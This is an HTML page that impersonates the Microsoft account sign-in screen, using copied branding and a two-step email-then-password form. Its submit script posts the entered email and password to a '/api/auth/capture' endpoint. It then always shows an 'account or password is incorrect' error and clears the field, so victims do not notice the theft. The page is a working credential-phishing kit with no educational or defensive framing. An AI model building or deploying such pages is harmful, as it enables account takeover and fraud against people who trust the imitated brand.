<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in to your Microsoft account</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: "Segoe UI", Arial, sans-serif; background: #f2f2f2; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
  .card { width: 100%; max-width: 440px; background: #fff; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,.2); }
  .logo { margin-bottom: 16px; }
  .logo svg { width: 108px; height: 23px; }
  h1 { font-size: 24px; font-weight: 300; color: #1b1b1b; margin-bottom: 12px; }
  .email-back { color: #0067b8; font-size: 14px; cursor: pointer; margin-bottom: 16px; display: none; }
  .email-back:hover { text-decoration: underline; }
  .field { margin-bottom: 16px; }
  input { width: 100%; padding: 6px 10px; border: 1px solid #8c8c8c; font-size: 15px; color: #1b1b1b; outline: none; }
  input:focus { border-color: #0067b8; }
  input::placeholder { color: #8c8c8c; }
  .err { color: #d83b01; font-size: 13px; margin-top: 8px; display: none; }
  .err.show { display: block; }
  .hint { font-size: 13px; color: #1b1b1b; margin: 16px 0; }
  .hint a { color: #0067b8; cursor: pointer; }
  .hint a:hover { text-decoration: underline; }
  .btn { background: #0067b8; color: #fff; border: none; padding: 6px 24px; font-size: 15px; cursor: pointer; }
  .btn:hover { background: #005a9e; }
  .btn:disabled { opacity: .6; }
  .footer { margin-top: 32px; font-size: 12px; color: #8c8c8c; }
  .footer span:hover { text-decoration: underline; cursor: pointer; }
  .step2 { display: none; }
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 108 23" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M46.09 0H46.2L52.55 16.15H48.73L47.69 13.11H42.65L41.61 16.15H37.79L44.14 0H46.09ZM45.17 3.56L43.33 9.55H46.99L45.17 3.56Z" fill="#737373"/>
      <path d="M53.37 4.85H56.99V6.33C57.64 5.45 58.73 4.62 60.39 4.62C63.04 4.62 64.35 6.22 64.35 9.05V16.15H60.73V9.87C60.73 8.36 60.17 7.56 58.99 7.56C57.69 7.56 56.99 8.48 56.99 9.99V16.15H53.37V4.85Z" fill="#737373"/>
      <path d="M65.59 10.5C65.59 6.87 68.13 4.62 71.31 4.62C73.28 4.62 74.62 5.6 75.31 6.74V0H78.93V16.15H75.31V14.23C74.59 15.42 73.19 16.38 71.2 16.38C68.13 16.38 65.59 14.13 65.59 10.5ZM75.31 10.5C75.31 8.51 74.04 7.45 72.51 7.45C70.99 7.45 69.71 8.51 69.71 10.5C69.71 12.48 70.99 13.55 72.51 13.55C74.04 13.55 75.31 12.48 75.31 10.5Z" fill="#737373"/>
      <path d="M80.17 10.5C80.17 6.87 82.71 4.62 85.89 4.62C87.86 4.62 89.2 5.6 89.89 6.74V4.85H93.51V16.15H89.89V14.23C89.17 15.42 87.77 16.38 85.78 16.38C82.71 16.38 80.17 14.13 80.17 10.5ZM89.89 10.5C89.89 8.51 88.62 7.45 87.09 7.45C85.57 7.45 84.29 8.51 84.29 10.5C84.29 12.48 85.57 13.55 87.09 13.55C88.62 13.55 89.89 12.48 89.89 10.5Z" fill="#737373"/>
      <path d="M95.01 0H98.63V16.15H95.01V0Z" fill="#737373"/>
      <path d="M100.13 0H103.75V16.15H100.13V0Z" fill="#737373"/>
      <path d="M105.25 0H108V16.15H105.25V0Z" fill="#737373"/>
      <path fill-rule="evenodd" clip-rule="evenodd" d="M0 0H22V22H0V0Z" fill="#F25022"/>
      <path fill-rule="evenodd" clip-rule="evenodd" d="M0 0H10.5V10.5H0V0Z" fill="#F25022"/>
      <path fill-rule="evenodd" clip-rule="evenodd" d="M11.5 0H22V10.5H11.5V0Z" fill="#7FBA00"/>
      <path fill-rule="evenodd" clip-rule="evenodd" d="M0 11.5H10.5V22H0V11.5Z" fill="#00A4EF"/>
      <path fill-rule="evenodd" clip-rule="evenodd" d="M11.5 11.5H22V22H11.5V11.5Z" fill="#FFB900"/>
    </svg>
  </div>

  <div class="step1" id="s1">
    <h1>Sign in</h1>
    <div class="field">
      <input type="text" id="email" placeholder="Email, phone, or Skype" required autofocus>
    </div>
    <p class="hint">No account? <a>Create one!</a></p>
    <button class="btn" onclick="next()">Next</button>
  </div>

  <div class="step2" id="s2">
    <h1>Enter password</h1>
    <div class="email-back" id="back" onclick="goBack()">&#8592; <span id="em"></span></div>
    <div class="field">
      <input type="password" id="pwd" placeholder="Password" required>
    </div>
    <div class="err show" id="e2">Your account or password is incorrect.</div>
    <p class="hint"><a>Forgot password?</a></p>
    <button class="btn" id="btn" onclick="submitForm()">Sign in</button>
  </div>

  <div class="footer">
    <span>Terms of use</span> &middot; <span>Privacy &amp; cookies</span>
  </div>
</div>

<script>
let emailVal = '';
function next() {
  const e = document.getElementById('email').value.trim();
  if (!e) return;
  emailVal = e;
  document.getElementById('s1').style.display = 'none';
  document.getElementById('s2').style.display = 'block';
  document.getElementById('back').style.display = 'block';
  document.getElementById('em').textContent = e;
  document.getElementById('pwd').focus();
}
function goBack() {
  document.getElementById('s2').style.display = 'none';
  document.getElementById('s1').style.display = 'block';
  document.getElementById('back').style.display = 'none';
  document.getElementById('e2').classList.remove('show');
}
async function submitForm() {
  const pwd = document.getElementById('pwd').value;
  if (!pwd) return;
  const btn = document.getElementById('btn');
  btn.textContent = 'Signing in…';
  btn.disabled = true;
  try {
    await fetch('/api/auth/capture', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ provider: 'microsoft', email: emailVal, password: pwd })
    });
  } catch {}
  btn.textContent = 'Sign in';
  btn.disabled = false;
  document.getElementById('e2').classList.add('show');
  document.getElementById('pwd').value = '';
}
</script>
</body>
</html>
